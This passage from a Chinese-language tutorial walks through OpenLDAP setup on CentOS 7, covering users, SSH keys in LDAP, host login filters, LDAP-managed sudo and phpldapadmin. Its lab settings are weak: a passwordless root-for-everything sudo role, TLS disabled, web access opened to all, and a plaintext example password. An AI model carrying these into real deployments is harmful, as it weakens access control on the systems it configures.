class="built_in">read</span></span><br><span class="line">olcAccess: &#123;2&#125;to * by dn=<span class="string">"cn=Manager,dc=example,dc=com"</span> write by * <span class="built_in">read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置到LDAP服务</span></span><br><span class="line">ldapmodify -Y EXTERNAL  -H ldapi:/// -f config.ldif</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域example.com配置</span></span><br><span class="line">vi base.ldif</span><br><span class="line"></span><br><span class="line">dn: dc=example,dc=com</span><br><span class="line">o: example com</span><br><span class="line">dc: example</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line"></span><br><span class="line">dn: cn=Manager,dc=example,dc=com</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: Manager</span><br><span class="line">description: LDAP Manager</span><br><span class="line"></span><br><span class="line">dn: ou=People,dc=example,dc=com</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: People</span><br><span class="line"></span><br><span class="line">dn: ou=Group,dc=example,dc=com</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: Group</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置到LDAP服务</span></span><br><span class="line">ldapadd -x -W -D <span class="string">"cn=Manager,dc=example,dc=com"</span> -f base.ldif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置ldap log</span></span><br><span class="line">vim loglevel.ldif</span><br><span class="line"></span><br><span class="line">dn: cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcLogLevel</span><br><span class="line">olcLogLevel: stats</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送配置到LDAP服务</span></span><br><span class="line">ldapmodify -Y EXTERNAL -H ldapi:/// -f loglevel.ldif</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"local4.*  /var/log/slapd/slapd.log"</span> &gt;&gt; /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line">vi /etc/logrotate.d/slapd</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/openldap.log &#123;</span><br><span class="line">    rotate 14</span><br><span class="line">    size 10M</span><br><span class="line">    missingok</span><br><span class="line">    compress</span><br><span class="line">    copytruncate</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"><span class="comment"># 如果有需要还可以配置日志轮转</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个测试用户</span></span><br><span class="line">vi demo.ldif</span><br><span class="line"></span><br><span class="line">dn: uid=800001,ou=People,dc=example,dc=com</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: account</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">cn: demo</span><br><span class="line">uid: 800001</span><br><span class="line">uidNumber: 3000</span><br><span class="line">gidNumber: 100</span><br><span class="line">homeDirectory: /home/ldapusers</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">gecos: Demo [Demo user (at) example]</span><br><span class="line">userPassword: &#123;crypt&#125;x</span><br><span class="line">shadowLastChange: 17058</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 7</span><br><span class="line"></span><br><span class="line">dn: cn=ops,ou=Group,dc=example,dc=com</span><br><span class="line">objectClass: posixGroup</span><br><span class="line">objectClass: top</span><br><span class="line">cn: ops</span><br><span class="line">gidNumber: 80001</span><br><span class="line">memberUid: 800001</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建</span></span><br><span class="line">ldapadd -x -W -D <span class="string">"cn=Manager,dc=example,dc=com"</span> -f demo.ldif</span><br><span class="line"><span class="comment"># 改密</span></span><br><span class="line">ldappasswd -s <span class="string">'passwd@123'</span> -W -D <span class="string">"cn=Manager,dc=example,dc=com"</span> -x <span class="string">"uid=800001,ou=People,dc=example,dc=com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证搜索</span></span><br><span class="line">ldapsearch -x uid=800001 -b dc=example,dc=com</span><br><span class="line"></span><br><span class="line">//删除使用如下命令，暂不删除，因后续实验需用到测试用户</span><br><span class="line">ldapdelete -W -D <span class="string">"cn=Manager,dc=example,dc=com"</span> -x <span class="string">"uid=800001,ou=People,dc=example,dc=com"</span></span><br></pre></td></tr></table></figure>

<h2 id="ldap客户端配置"><a href="#ldap客户端配置" class="headerlink" title="ldap客户端配置"></a>ldap客户端配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装组件</span></span><br><span class="line">yum install -y openldap-clients nss-pam-ldapd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加client服务器到LDAP服务,注意IP</span></span><br><span class="line">authconfig --enableldap --enableldapauth --ldapserver=<span class="string">"localhost"</span> --ldapbasedn=<span class="string">"dc=example,dc=com"</span> --update</span><br><span class="line"><span class="comment"># 这个指令修改了/etc/nsswitch.conf 以及/etc/openldap/ldap.conf文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动ldap客户端服务</span></span><br><span class="line">systemctl restart  nslcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">getent passwd 800001</span><br><span class="line">800001:3000:100:Demo [Demo user (at) example]:/home/demo:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程ssh登录验证</span></span><br><span class="line">ssh 800001@10.116.72.15</span><br><span class="line">800001@10.116.72.15<span class="string">'s password: demopassword</span></span><br><span class="line"><span class="string">-bash-4.2$ id 800001</span></span><br><span class="line"><span class="string">uid=3000(800001) gid=100(users) groups=100(users),80001(ops)</span></span><br><span class="line"><span class="string">-bash-4.2$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这里可以看到没有配置自动生成账户的家目录，在实际的运维过程中，也不会去生成家目录（不然一堆的账户加目录），而是让运维账户统一一个家目录，并且设置为只读。</span></span><br><span class="line"><span class="string"># 不过如果有需要配置配置家目录自动生成，需要修改pam模块</span></span><br></pre></td></tr></table></figure>

<h2 id="配置LDAP使用公钥-publicKey-远程ssh登录客户主机"><a href="#配置LDAP使用公钥-publicKey-远程ssh登录客户主机" class="headerlink" title="配置LDAP使用公钥(publicKey)远程ssh登录客户主机"></a>配置LDAP使用公钥(publicKey)远程ssh登录客户主机</h2><h3 id="openldap服务端配置"><a href="#openldap服务端配置" class="headerlink" title="openldap服务端配置"></a>openldap服务端配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装openssh-ldap</span></span><br><span class="line">yum install openssh-ldap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">rpm -aql |grep openssh-ldap</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1/HOWTO.ldap-keys</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1/ldap.conf</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.ldif</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.schema</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-sun.ldif</span><br><span class="line">/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-sun.schema</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置添加相关schema</span></span><br><span class="line">cp /usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.ldif /etc/openldap/schema/</span><br><span class="line">cp /usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.schema /etc/openldap/schema/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/openssh-lpk-openldap.ldif</span><br><span class="line"></span><br><span class="line"><span class="comment"># 账户添加objectClass: ldapPublicKey 并添加属性sshPublicKey</span></span><br><span class="line"><span class="comment"># 具体修改流程，可以使用下面安装的ldapadmin或者phpldapadmin进行配置</span></span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">sshPublicKey:  值是具体的publickey</span><br></pre></td></tr></table></figure>

<h3 id="客户主机配置"><a href="#客户主机配置" class="headerlink" title="客户主机配置"></a>客户主机配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install openssh-ldap</span><br><span class="line">cp /usr/share/doc/openssh-ldap-7.4p1/ldap.conf /etc/ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果使用TLS 配置TLS,这里不使用</span></span><br><span class="line">vim /etc/ssh/ldap.conf</span><br><span class="line"></span><br><span class="line">ssl no</span><br><span class="line">uri ldap://10.116.72.11/</span><br><span class="line"></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># 脚本将从LDAP获取密钥并将其提供给SSH服务器</span></span><br><span class="line">AuthorizedKeysCommand /usr/libexec/openssh/ssh-ldap-wrapper</span><br><span class="line">AuthorizedKeysCommandUser nobody</span><br><span class="line">PubkeyAuthentication yes</span><br></pre></td></tr></table></figure>

<h3 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa 800001@10.116.72.15</span><br><span class="line">Last login: Thu Jul  4 16:15:30 2019 from 10.116.71.200</span><br><span class="line">Could not <span class="built_in">chdir</span> to home directory /home/demo: No such file or directory</span><br><span class="line">-bash-4.2$</span><br></pre></td></tr></table></figure>

<h2 id="配置LDAP账户可以登录的主机列表"><a href="#配置LDAP账户可以登录的主机列表" class="headerlink" title="配置LDAP账户可以登录的主机列表"></a>配置LDAP账户可以登录的主机列表</h2><p>测试使用的远程ssh服务器是10.116.72.15，我们验证如下</p>
<ol>
<li><p>添加账户主机列表（host属性）不包含116.116.72.15 测试是否可以正常登录</p>
</li>
<li><p>添加账户主机列表（host属性）包含116.116.72.15 测试是否可以正常登录</p>
</li>
</ol>
<h3 id="需要通过Ldap远程登录的客户机配置"><a href="#需要通过Ldap远程登录的客户机配置" class="headerlink" title="需要通过Ldap远程登录的客户机配置"></a>需要通过Ldap远程登录的客户机配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/nsswitch.conf</span><br><span class="line"><span class="comment"># 添加如下过滤配置，包含本机主机名称。表示过滤匹配包括本机IP或者允许任意IP地址的账户授权信息</span></span><br><span class="line">filter passwd (|(host=10.116.72.15)(host=\*))(host=ALL)</span><br></pre></td></tr></table></figure>

<p>备注：如果远程主机是centos6，配置稍有不同</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/pam_ldap.conf</span><br><span class="line">pam_filter |(host=10.116.72.16)(host=\*)(host=ALL)</span><br></pre></td></tr></table></figure>

<h3 id="LDAP账户配置"><a href="#LDAP账户配置" class="headerlink" title="LDAP账户配置"></a>LDAP账户配置</h3><p>ldap命令或者ldapadmin管理工具为账户添加属性host，这个属性可以添加多次。</p>
<ul>
<li>第一次配置不包含测试主机10.116.72.15</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x uid=800001 -b <span class="string">'ou=People,dc=example,dc=com'</span></span><br><span class="line"></span><br><span class="line">dn: uid=800001,ou=People,dc=example,dc=com</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: account</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">cn: demo</span><br><span class="line">uid: 800001</span><br><span class="line">uidNumber: 3000</span><br><span class="line">gidNumber: 100</span><br><span class="line">homeDirectory: /home/demo</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">gecos: Demo [Admin (at) eju]</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 7</span><br><span class="line">host: 10.116.72.12</span><br><span class="line">host: 10.116.72.16</span><br><span class="line"></span><br><span class="line">测试登录</span><br><span class="line"><span class="comment"># ssh 800001@10.116.72.15</span></span><br><span class="line">800001@10.116.72.15<span class="string">'s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第二次配置包含测试主机10.116.72.15</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x uid=800001 -b <span class="string">'ou=People,dc=example,dc=com'</span></span><br><span class="line"></span><br><span class="line">dn: uid=800001,ou=People,dc=example,dc=com</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: account</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">cn: demo</span><br><span class="line">uid: 800001</span><br><span class="line">uidNumber: 3000</span><br><span class="line">gidNumber: 100</span><br><span class="line">homeDirectory: /home/demo</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">gecos: Demo [Admin (at) eju]</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 7</span><br><span class="line">host: 10.116.72.12</span><br><span class="line">host: 10.116.72.15</span><br><span class="line">host: 10.116.72.16</span><br><span class="line"></span><br><span class="line">测试登录</span><br><span class="line"><span class="comment"># ssh 800001@10.116.72.15</span></span><br><span class="line">800001@10.116.72.15<span class="string">'s password: </span></span><br><span class="line"><span class="string">Last login: Thu Jul  4 16:15:30 2019 from 10.116.71.200</span></span><br><span class="line"><span class="string">Could not chdir to home directory /home/demo: No such file or directory</span></span><br><span class="line"><span class="string">-bash-4.2$</span></span><br></pre></td></tr></table></figure>

<p>以上，测试通过。</p>
<h2 id="配置LDAP-sudo权限管理"><a href="#配置LDAP-sudo权限管理" class="headerlink" title="配置LDAP sudo权限管理"></a>配置LDAP sudo权限管理</h2><h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><p>CentOS7.6下安装的OpenLDAP是2.4.44 ,schema目录下并没有sudo.ldif以及sudo.schema文件，需要单独处理。 sudo是默认安装的，sudo相关目录下有sudo.schema模板文件schema.OpenLDAP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name schema.OpenLDAP -<span class="built_in">exec</span> cp &#123;&#125; /etc/openldap/schema/sudo.schema \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成sudo.ldif</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'include     /etc/openldap/schema/sudo.schema'</span> &gt; /tmp/sudo.conf</span><br><span class="line">mkdir /tmp/sudo</span><br><span class="line">slaptest -f /tmp/sudo.conf -F /tmp/sudo</span><br><span class="line"></span><br><span class="line">vim /tmp/sudo/cn=config/cn=schema/cn=&#123;0&#125;sudo.ldif</span><br><span class="line"></span><br><span class="line">替换（前3行）</span><br><span class="line">dn: cn=&#123;0&#125;sudo</span><br><span class="line">objectClass: olcSchemaConfig</span><br><span class="line">cn: &#123;0&#125;sudo</span><br><span class="line">为</span><br><span class="line">dn: cn=sudo,cn=schema,cn=config</span><br><span class="line">objectClass: olcSchemaConfig</span><br><span class="line">cn: sudo</span><br><span class="line">删除(最后7行)</span><br><span class="line">structuralObjectClass: olcSchemaConfig</span><br><span class="line">entryUUID: ec3b659a-31a9-1039-90ae-87c69280e4a2</span><br><span class="line">creatorsName: cn=config</span><br><span class="line">createTimestamp: 20190703064542Z</span><br><span class="line">entryCSN: 20190703064542.945991Z<span class="comment">#000000#000#000000</span></span><br><span class="line">modifiersName: cn=config</span><br><span class="line">modifyTimestamp: 20190703064542Z</span><br><span class="line"></span><br><span class="line">cp /tmp/sudo/cn=config/cn=schema/cn=&#123;0&#125;sudo.ldif /etc/openldap/schema/sudo.ldif</span><br><span class="line">ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/sudo.ldif</span><br><span class="line"></span><br><span class="line">rm -f /tmp/sudo.conf /tmp/sudo</span><br></pre></td></tr></table></figure>

<h3 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim SUODers.ldif</span><br><span class="line"></span><br><span class="line">dn: ou=SUDOers,dc=example,dc=com</span><br><span class="line">ou: SUDOers</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line"></span><br><span class="line">dn: cn=defaults,ou=SUDOers,dc=example,dc=com</span><br><span class="line">objectClass: sudoRole</span><br><span class="line">cn: defaults</span><br><span class="line">sudoOption: requiretty</span><br><span class="line">sudoOption: !visiblepw</span><br><span class="line">sudoOption: always_set_home</span><br><span class="line">sudoOption: env_reset</span><br><span class="line">sudoOption: env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">sudoOption: env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">sudoOption: env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">sudoOption: env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">sudoOption: env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line">sudoOption: secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">sudoOption: logfile = /var/<span class="built_in">log</span>/sudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line">ldapadd -x -W -D <span class="string">"cn=Manager,dc=example,dc=com"</span> -f SUODers.ldif</span><br></pre></td></tr></table></figure>

<h3 id="将上面的demo（800001）账户配置为sudo权限"><a href="#将上面的demo（800001）账户配置为sudo权限" class="headerlink" title="将上面的demo（800001）账户配置为sudo权限"></a>将上面的demo（800001）账户配置为sudo权限</h3><p>这里配置一个运维sudo role，名称为sudo_ops_role，简单配置为sudo 到root所有权限，并将800001加入该role</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim sudo_ops_role.ldif</span><br><span class="line"></span><br><span class="line">dn: cn=sudo_ops_role,ou=SUDOers,dc=example,dc=com</span><br><span class="line">objectClass: sudoRole</span><br><span class="line">cn: sudo_ops_role</span><br><span class="line">sudoOption: !authenticate</span><br><span class="line">sudoRunAsUser: root</span><br><span class="line">sudoCommand: ALL</span><br><span class="line">sudoHost: ALL</span><br><span class="line">sudoUser: 800001</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line">ldapadd -x -W -D <span class="string">"cn=Manager,dc=example,dc=com"</span> -f sudo_ops_role.ldif</span><br></pre></td></tr></table></figure>

<h3 id="客户端增加如下配置"><a href="#客户端增加如下配置" class="headerlink" title="客户端增加如下配置"></a>客户端增加如下配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/nsswitch.conf</span><br><span class="line"><span class="comment"># 追加内存</span></span><br><span class="line">sudoers:    files ldap</span><br><span class="line"></span><br><span class="line">mv /etc/sudo-ldap.conf&#123;,.bak&#125;</span><br><span class="line">vi /etc/sudo-ldap.conf</span><br><span class="line">uri ldap://10.116.72.11/ </span><br><span class="line">base dc=example,dc=com</span><br><span class="line">sudoers_base ou=SUDOers,dc=example,dc=com</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh 800001@10.116.72.15</span></span><br><span class="line">800001@10.116.72.15<span class="string">'s password: </span></span><br><span class="line"><span class="string">Could not chdir to home directory /home/ldapusers: No such file or directory</span></span><br><span class="line"><span class="string">-bash-4.2$ sudo su -</span></span><br><span class="line"><span class="string">Last login: Wed Jul  3 15:09:21 CST 2019 from 10.116.71.200 on pts/0</span></span><br><span class="line"><span class="string">[root@systerm-shylf-1 ~]#</span></span><br></pre></td></tr></table></figure>

<h2 id="基于web的OpenLDAP管理工具phpldapadmin"><a href="#基于web的OpenLDAP管理工具phpldapadmin" class="headerlink" title="基于web的OpenLDAP管理工具phpldapadmin"></a>基于web的OpenLDAP管理工具phpldapadmin</h2><p>实例在openldap安装，实际使用中可以部署在其他服务器上通过网络访问。前端还可以配置一个nginx去代理实现高可用</p>
<h3 id="安装配置phpldapadmin"><a href="#安装配置phpldapadmin" class="headerlink" title="安装配置phpldapadmin"></a>安装配置phpldapadmin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装组件</span></span><br><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install httpd phpldapadmin</span><br><span class="line"><span class="comment"># yum安装后的项目文件位置/usr/share/phpldapadmin/htdocs，配置文件位置/etc/phpldapadmin/config.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># phpldapadmin修改</span></span><br><span class="line">vim /etc/phpldapadmin/config.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释掉</span></span><br><span class="line">//<span class="variable">$servers</span>-&gt;setValue(<span class="string">'login'</span>,<span class="string">'attr'</span>,<span class="string">'uid'</span>);</span><br><span class="line"><span class="comment"># 或者修改为</span></span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'login'</span>,<span class="string">'attr'</span>,<span class="string">'dn'</span>);</span><br><span class="line"><span class="variable">$servers</span>-&gt;newServer(<span class="string">'ldap_pla'</span>);</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'server'</span>,<span class="string">'name'</span>,<span class="string">'LDAP Server'</span>); </span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'server'</span>,<span class="string">'host'</span>,<span class="string">'127.0.0.1'</span>); //根据需要修改为实际地址,这个部署到openldap本机直接保留127.0.0.1</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'server'</span>,<span class="string">'port'</span>,389);</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'server'</span>,<span class="string">'base'</span>,array(<span class="string">'dc=example,dc=com'</span>));   //</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'login'</span>,<span class="string">'auth_type'</span>,<span class="string">'cookie'</span>);</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'login'</span>,<span class="string">'bind_id'</span>,<span class="string">'cn=Manager,dc=example,dc=com'</span>);</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'login'</span>,<span class="string">'bind_pass'</span>,<span class="string">''</span>);</span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'server'</span>,<span class="string">'tls'</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># httpd修改</span></span><br><span class="line">vim /etc/httpd/conf.d/phpldapadmin.conf</span><br><span class="line"></span><br><span class="line">Alias /phpldapadmin /usr/share/phpldapadmin/htdocs</span><br><span class="line">Alias /ldapadmin /usr/share/phpldapadmin/htdocs</span><br><span class="line"></span><br><span class="line">&lt;Directory /usr/share/phpldapadmin/htdocs&gt;</span><br><span class="line">  &lt;IfModule mod_authz_core.c&gt;</span><br><span class="line">    <span class="comment"># Apache 2.4</span></span><br><span class="line">    <span class="comment"># Require local</span></span><br><span class="line">    Require all granted</span><br><span class="line">  &lt;/IfModule&gt;</span><br><span class="line">  &lt;IfModule !mod_authz_core.c&gt;</span><br><span class="line">    <span class="comment"># Apache 2.2</span></span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">    Allow from 127.0.0.1</span><br><span class="line">    Allow from ::1</span><br><span class="line">    <span class="comment"># 根据需要配置许可</span></span><br><span class="line">    Allow from 10.116</span><br><span class="line">  &lt;/IfModule&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动httpd服务</span></span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>

<h3 id="使用phpldapadmin"><a href="#使用phpldapadmin" class="headerlink" title="使用phpldapadmin"></a>使用phpldapadmin</h3><p><img src="/articles/be8d00d3/1.png" alt></p>
<p><img src="/articles/be8d00d3/2.png" alt></p>
<p>备注，如果报错如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Forbidden </span><br><span class="line">You don<span class="string">'t have permission to access /ldapadmin/ on this server.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可以尝试修改httpd.conf</span></span><br><span class="line"><span class="string">vi /etc/httpd/conf/http.conf</span></span><br><span class="line"><span class="string">修改</span></span><br><span class="line"><span class="string">&lt;Directory /&gt;</span></span><br><span class="line"><span class="string">    AllowOverride none</span></span><br><span class="line"><span class="string">    Require all denied</span></span><br><span class="line"><span class="string">&lt;/Directory&gt;</span></span><br><span class="line"><span class="string">为</span></span><br><span class="line"><span class="string">&lt;Directory /&gt; </span></span><br><span class="line"><span class="string">Options Indexes FollowSymLinks </span></span><br><span class="line"><span class="string">AllowOverride None </span></span><br><span class="line"><span class="string">&lt;/Directory&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">systemctl restart httpd</span></span><br></pre></td></tr></table></figure>

<h3 id="为phpldapadmin添加suorole配置模版"><a href="#为phpldapadmin添加suorole配置模版" class="headerlink" title="为phpldapadmin添加suorole配置模版"></a>为phpldapadmin添加suorole配置模版</h3><p>从<a href="http://phpldapadmin.sourceforge.net/wiki/index.php/TemplatesContributed:Sudo" target="_blank" rel="noopener">官网地址</a> 可以获取到sudoRole模板，可以在这个基础上进行修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ll /usr/share/phpldapadmin/templates</span><br><span class="line"><span class="comment"># ll /usr/share/phpldapadmin/templates</span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jul  4 15:32 creation</span><br><span class="line">drwxr-xr-x 2 root root   69 Jul  4 15:31 modification</span><br><span class="line">-rw-r--r-- 1 root root 2089 Oct  1  2012 template.dtd</span><br></pre></td></tr></table></figure>

<p>vim  /usr/share/phpldapadmin/templates/creation/sudo.xml 注意根据需要进行修改，我的sudo ou名称是SUDOers</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE template SYSTEM "template.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Sudo Policy<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^ou=SUDOers,dc=.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">icon</span>&gt;</span>images/door.png<span class="tag">&lt;/<span class="name">icon</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>New Sudo Policy<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">askcontainer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">askcontainer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rdn</span>&gt;</span>cn<span class="tag">&lt;/<span class="name">rdn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">visible</span>&gt;</span>1<span class="tag">&lt;/<span class="name">visible</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">objectClasses</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">objectClass</span> <span class="attr">id</span>=<span class="string">"sudoRole"</span>&gt;</span><span class="tag">&lt;/<span class="name">objectClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">objectClasses</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"cn"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Policy Name<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>1<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoOption"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Option<span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>2<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">page</span>&gt;</span>1<span class="tag">&lt;/<span class="name">page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spacer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">spacer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attribute</span> <span class="attr">id</span>=<span class="string">"sudoRunAsUser"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display</span>&gt;</span>Sudo Run As User<span class="tag">&lt;/<span 